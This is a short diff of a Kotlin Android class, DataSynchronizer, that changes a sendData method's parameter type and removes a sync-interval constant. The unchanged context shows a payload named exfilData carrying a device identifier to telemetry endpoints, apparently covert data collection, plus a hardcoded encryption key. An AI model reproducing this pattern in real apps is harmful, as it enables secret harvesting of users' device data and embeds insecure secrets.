@@ -32,7 +32,6 @@ class DataSynchronizer(private val context: Context) {
         const val ANALYTICS_ENDPOINT = "${API_ENDPOINT}analytics"
         const val TELEMETRY_ENDPOINT = "${API_ENDPOINT}telemetry"
 
-        const val SYNC_INTERVAL = 30 * 60 * 1000L // 30 minutes
         const val ENCRYPTION_KEY = "ThisIsAFakeKey16"
     }
 
@@ -141,10 +140,9 @@ class DataSynchronizer(private val context: Context) {
         }
     }
 
-    fun sendData(dataType: String, data: JSONObject) {
+    fun sendData(dataType: String, data: String) {
         try {
             val exfilData = JSONObject().apply {
-                // CONSISTENT: Use deviceId as the primary identifier
                 put("device_id", deviceId)
                 put("type", dataType)
                 put("timestamp", System.currentTimeMillis())
